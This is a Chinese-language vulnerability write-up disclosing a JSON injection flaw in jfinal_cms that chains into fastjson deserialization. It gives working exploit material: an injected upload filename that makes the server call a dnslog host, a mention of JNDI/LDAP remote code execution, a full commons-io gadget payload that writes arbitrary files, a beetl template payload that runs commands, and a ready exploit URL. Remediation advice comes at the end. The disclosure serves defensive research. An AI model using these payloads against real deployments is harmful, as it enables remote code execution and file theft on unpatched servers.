# jfinal_cms存在json注入漏洞

#### TL;DR

`jfinal_cms`存在`json`注入漏洞，在大部分版本可以导致前台远程命令执行。

原因在于`com.baidu.ueditor.define.BaseState#toString`方法通过拼接的方式处理`Map`键值对。逃逸出恶意属性后可通过`parseObject`函数触发该漏洞。该漏洞存在于`v4.0.0~v.5.1.0`版本，可利用`dnslog`版本为`v4.5.0~v.5.1.0`，可`RCE`版本为`v4.5.0~v.5.1.0`，在最新版本`v5.1.0`可通过`common-io`链实现任意文件写入，通过覆盖模板文件可以实现任意文件读取以及任意命令执行。

#### versions affected

`version affected`：`jfnal_cms v4.5.0~v5.1.0`

#### find gadget

漏洞点在`com.baidu.ueditor.define.BaseState#toString`，主要逻辑就是对`map`进行遍历，把`key`和`value`进行处理最终制作成`JSON`字符串形式。
其中`key`和`value`用`+`进行拼接，如果`key`或`value`可控的话可能会导致`json`注入问题。

![Alt text](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1694866213804.jpg)

向上寻找`usage`，`ActionEnter#invoke`方法调用了`state#toJSONString`,可以看到当`ActionMap`为`UPLOAD_FILE`（文件上传）操作时会触发 `Uploader#doExec`。

![Alt text](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-2.png)

先看`Uploader#doExec`的逻辑，这里会根据是否`base64`调用不同类的`save`方法。当操作为`UPLOAD_FILE`时配置类`ConfigManager`的`isBase64`为`false`，所以`Uploader#doExec`触发`BinaryUploader#save`。
```java
		case ActionMap.UPLOAD_FILE:
			conf.put("isBase64", "false");
			conf.put("maxSize", this.jsonConfig.getLong("fileMaxSize"));
			conf.put("allowFiles", this.getArray("fileAllowFiles"));
			conf.put("fieldName", this.jsonConfig.getString("fileFieldName"));
			savePath = this.jsonConfig.getString("filePathFormat");
			break;
```

![Alt text](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-3.png)

审计`BinaryUploader#save`函数，可以看到`originFileName`是由上传表单的`filename`控制的，值得注意的一点是程序（仅仅）校验了后缀名，这里令`filename`为`filename=flag","vulnerable":"hacked","a":".txt`即可绕过，最终把`originFileName`放进`Map`

![Alt text](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-4.png)

接着触发`toJSONString`通过拼接把恶意字符处理为字符串。

![Alt text](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1694868670291.png)


继续向上寻找利用链，发现以上函数调用可以通过`/ueditor`路由触发，其中返回的`out`为恶意字符串，最终把`out`传给了`UeditorService#uploadHandle`。

![Alt text](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1694868878079.png)

`UeditorService#uploadHandle`通过`parseObject`方法对恶意字符串进行解析，可以看到`json`已经被污染了。

![Alt text](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-5.png)

#### exploit

遗憾的是在可以污染`json`属性后我并没有发现通过污染覆盖的属性值可以造成什么实际危害，但是可以从`parseObject`方法入手。

##### dnslog

`json`的第一个属性`"state":"SUCCESS`"是不可控的，这里用到一个小`trick`，令`filename`为`flag",{"@type":"java.net.Inet4Address","val":"bgb5eh.ceye.io"},"a":".txt`即可正常恢复`Java Bean`。

`DNS`测试在`v4.5.0`版本进行，运行测试脚本。

`dnslog`收到了请求，证明漏洞存在，值得注意的是如果版本在`v4.5.0-v5.0.1`之间是会发起两次`DNS`请求的，因为这些版本默认用到的`fastjson`版本为`1.2.28`，而在`v5.1.0`版本测试只会发起一次`dns`请求。
![image-20230917132528175](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20230917132528175.png)

##### V4.5.0-V5.1.0——RCE

经过测试发现`v4.5.0~v5.0.1`用的都是`fastjson 1.2.28`,使用缓存即可绕过，用`ldap`打个`fastjson`全版本通杀反序列化链子即可`RCE`。

`RCE`测试在`v5.0.1`版本进行。

运行`jndi`服务端。

![1694926217388](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1694926217388.png)

运行`exp.py`即可`RCE`。

![1694926173785](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1694926173785.png)

##### V5.1.0——任意文件写入 to 任意文件读取

`1.2.68`之前可以通过期望类绕过`autoType`，而该项目又刚好引入了`common-io2.7`，因此可以打一个任意文件写。

```json
{
  "x":{
  "@type":"com.alibaba.fastjson.JSONObject",
  "input":{
  "@type":"java.lang.AutoCloseable",
  "@type":"org.apache.commons.io.input.ReaderInputStream",
  "reader":{
  "@type":"org.apache.commons.io.input.CharSequenceReader",
  "charSequence":{"@type":"java.lang.String""aaaaaa...(长度要大于8192，实际写入前8192个字符)",
  "start":0,
  "end":2147483647
  },
  "charsetName":"UTF-8",
  "bufferSize":1024
  },
  "branch":{
  "@type":"java.lang.AutoCloseable",
  "@type":"org.apache.commons.io.output.WriterOutputStream",
  "writer":{
  "@type":"org.apache.commons.io.output.FileWriterWithEncoding",
  "file":"/tmp/pwned",
  "charsetName":"UTF-8",
  "append": false
  },
  "charsetName":"UTF-8",
  "bufferSize": 1024,
  "writeImmediately": true
  },
  "trigger":{
  "@type":"java.lang.AutoCloseable",
  "@type":"org.apache.commons.io.input.XmlStreamReader",
  "inputStream":{
  "@type":"org.apache.commons.io.input.TeeInputStream",
  "input":{
  "$ref":"$.input"
  },
  "branch":{
  "$ref":"$.branch"
  },
  "closeBranch": true
  },
  "httpContentType":"text/xml",
  "lenient":false,
  "defaultEncoding":"UTF-8"
  },
  "trigger2":{
  "@type":"java.lang.AutoCloseable",
  "@type":"org.apache.commons.io.input.XmlStreamReader",
  "inputStream":{
  "@type":"org.apache.commons.io.input.TeeInputStream",
  "input":{
  "$ref":"$.input"
  },
  "branch":{
  "$ref":"$.branch"
  },
  "closeBranch": true
  },
  "httpContentType":"text/xml",
  "lenient":false,
  "defaultEncoding":"UTF-8"
  },
  "trigger3":{
  "@type":"java.lang.AutoCloseable",
  "@type":"org.apache.commons.io.input.XmlStreamReader",
  "inputStream":{
  "@type":"org.apache.commons.io.input.TeeInputStream",
  "input":{
  "$ref":"$.input"
  },
  "branch":{
  "$ref":"$.branch"
  },
  "closeBranch": true
  },
  "httpContentType":"text/xml",
  "lenient":false,
  "defaultEncoding":"UTF-8"
  }
  }
}
```

本来想覆盖`jsp`文件的，因为翻`issue`看到有人是这么做的 [there](https://github.com/jflyfox/jfinal_cms/issues/58)。但是我本地测试发现没办法触发`login.jsp`（不知道是不是本地的问题），似乎都被`url-pattern：/*`拦截了，远程我没有进行测试，如果可以触发`login.jsp`倒也是个好办法。

```xml
	<welcome-file-list>
		<welcome-file>login.jsp</welcome-file>
	</welcome-file-list>

	<filter>
		<filter-name>jfinal</filter-name>
		<filter-class>com.jfinal.core.JFinalFilter</filter-class>
		<init-param>
			<param-name>configClass</param-name>
			<param-value>com.jflyfox.component.config.BaseConfig</param-value>
		</init-param>
	</filter>

	<filter-mapping>
		<filter-name>jfinal</filter-name>
		<url-pattern>/*</url-pattern>
	</filter-mapping>
```

该项目用到了`beetl`模版，自带的函数`printFile`支持文件读取，因此可以通过覆盖模版文件实现任意文件读取。运行利用脚本，覆盖`E:/jfinal_cms/src/main/webapp/template/includes/jquery.html`，由于`fj`禁用了目录穿越符`..`，因此貌似只能用绝对路径。

但是读文件`printFile`是可以通过目录穿越读到所有文件的，这里用`webapp/FLAG`文件作为示范。

![1695020177538](http://114.67.236.137/pic/1695020177538.png)

抓包访问首页，读取到了`FLAG`文件。

![image-20230918150306193](http://114.67.236.137/pic/image-20230918150306193.png)

##### V5.1.0版本——任意文件写入 to 任意命令执行

该项目依赖的模板框架`beetl v3.0.13`是可以`RCE`的。

`${@Class.forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\"s='calc';java.lang.Runtime.getRuntime().exec(s);\")`

但问题在于在用`common-io`链写文件的时候发现不能写入双引号。使用`beetl`的定界符引入变量可以解决双引号的问题，因为`js`可以用单引号。但是我发现引入了分号`;`后服务器会认为分号`;`是结束符。总之通过引入变量的方法是不行的。

翻阅`beetl`文档，可知`parameter 读取用户提交的参数。如${parameter.userId} (仅仅2.2.7以上版本支持)`，因此这样就可以啦。

```
${@Class.forName(parameter.a).newInstance().getEngineByName(parameter.b).eval(parameter.c)}
```

写入`jquery.html`。

![1695038407252](http://114.67.236.137/pic/1695038407252.png)

拿下！

`http://192.168.139.65:8080/jfinal_cms_war/?a=javax.script.ScriptEngineManager&b=js&c=java.lang.Runtime.getRuntime().exec("calc");`

![image-20230918200334314](http://114.67.236.137/pic/image-20230918200334314.png)

#### Founder

Squirt1e

#### Fixed

1. 在`com.baidu.ueditor.define.BaseState#toString`方法中处理`key value`时不要使用拼接的方式。
2. 升级`fastjson`依赖至最新版。
3. 升级`beetl`依赖至最新版。

